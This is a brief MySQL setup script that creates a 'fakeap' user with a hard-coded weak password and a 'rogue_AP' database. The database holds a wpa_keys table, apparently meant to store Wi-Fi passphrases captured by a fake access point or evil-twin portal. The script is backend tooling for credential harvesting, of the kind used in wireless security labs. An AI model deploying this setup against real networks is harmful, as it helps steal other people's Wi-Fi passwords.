create user fakeap@localhost identified by 'fakeap';
create DATABASE rogue_AP;
use rogue_AP;
create table wpa_keys(password1 varchar(32), password2 varchar(32));
GRANT all privileges on rogue_AP.* to 'fakeap'@'localhost';
